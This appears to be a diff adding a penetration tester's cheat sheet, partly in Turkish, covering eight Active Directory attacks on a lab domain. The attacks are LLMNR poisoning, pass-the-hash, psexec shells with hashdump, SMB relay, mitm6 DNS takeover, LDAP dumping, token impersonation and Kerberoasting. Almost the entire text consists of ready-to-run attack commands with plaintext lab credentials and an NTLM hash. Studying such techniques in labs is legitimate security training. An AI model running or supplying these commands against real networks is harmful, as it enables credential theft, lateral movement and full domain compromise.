@@ -1,0 +1,169 @@
+1. SALDIRI------LLMNR POISONING------
+
+Responder.py
+Step 1:
+Responder -I eth0 -Pv 
+
+Step 2:
+An event occurs in the victim machine, somebody typed a wrong network drive
+
+Step3:
+Get dem hashes.
+
+Step4:
+Crack dem hashes
+hashcat -m 5600 hashes.txt rockyou.txt
+
+
+2. SALDIRI------Pass the Password ve Pass the Hash-------
+
+crackmapexec smb 192.168.26.0/24 -u mbalta -p 'Password!' 
+
+crackmapexec smb 192.168.26.0/24 -u mbalta -p 'Password!' --sam
+
+
+crackmapexec smb 192.168.26.0/24 -u Client -H 'aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc' --local-auth
+
+
+
+
+3. SALDIRI------Gaining Shell Access-------
+
+msfconsole
+search psexec
+use 4----exploit/windows/smb/psexec
+
+set RHOSTS 192.168.26.139
+set SMBUser mbalta
+set SMBSHARE ADMIN$
+set SMBDomain garanti.local
+set SMBPass 'Password!'
+
+set target 2 // Native Upload
+exploit
+
+***Meterpreterdeyken;
+
+hashdump ---- komut sayesinde local kullanıcıların hashlerini elde ederiz
+
+
+shell  ----------------- bu komut ile windows cmd'ye ineriz
+
+net users ----- cihazdaki local kullanıcıları listeler
+
+net user Client --- 'Client' kullanıcısın bilgilerini getirir
+
+
+
+4. SALDIRI------SMB Relay-------
+
+mousepad /usr/share/responder/Responder.conf
+
+smb = off , http = off //Bu şekilde kaydediyoruz.
+
+responder -I eth0 -Pv
+
+Targetın smb signingi kapalı ya da not required olması lazım -- kontrol etmek için:
+
+nmap --script=smb2-security-mode.nse 192.168.26.0/24 -p445
+
+
+mousepad targets.txt --- 192.168.26.139
+
+impacket-ntlmrelayx -tf targets.txt -smb2support
+
+
+
+
+
+
+5. SALDIRI-------IPv6 DNS Take Over---------
+
+mitm6 -d garanti.local
+
+impacket-ntlmrelayx -6 -t ldaps://192.168.26.134 -wh fakewpad.garanti.local -l loot
+
+cd loot
+
+firefox domain_users_by_group.html
+
+
+
+
+6. SALDIRI-------LDAP Domain Dump---------
+
+mkdir ldap //çok fazla dosya olacağı için klasör oluşturuyoruz.
+
+cd ldap
+
+ldapdomaindump 192.168.26.134 -u garanti.local\\mbalta -p 'Password!'
+
+ls -la
+
+firefox domain_users_by_group.html
+
+
+
+
+
+7. SALDIRI---------Token Impersonation W/ Incognito-------
+
+search psexec
+
+set options 
+
+set RHOSTS 192.168.26.139
+set SMBUser mbalta
+set SMBSHARE ADMIN$
+set SMBDomain garanti.local
+set SMBPass 'Password!'
+
+set target 2 (native upload)
+
+exploit
+
+load incognito
+load mimikatz
+load powershell
+
+list_tokens -u
+
+impersonate_token GARANTI\\Administrator
+
+shell 
+
+whoami
+
+net user administrator /DOMAIN
+
+
+
+
+
+
+8. SALDIRI-------Kerberoasting Overview----------
+
+KDC = Key Distribution Center
+TGT = Ticket Granting Ticket
+krbtgt = kerberos ticket granting ticket hash 
+SPN = Service Principal Name
+TGS = Ticket Granting server 
+
+1. Victim Request TGT from DC, Provides NTLM Hash(Cred hashes)
+2. Dc sends TGT enc w/ krbtgt
+3. Victim Requests TGS for app server, Provides TGT
+4. Dc sends TGS enc w/ server's account hash 
+
+Goal of kerberoasting: 
+	Get TGS and decrypt server's account hash
+
+5. Present TGS for service enc w/ server's account
+6. used when mutual authentication is required
+
+Step 1 : GET SPNs, Dump hash
+
+impacket-GetUserSPNs garanti.local/mbalta:'Password!' -dc-ip 192.168.26.134 -request
+
+Step2: Crack that hash
+
+hashcat -m 13100 kerberoast.txt rockyou.txt
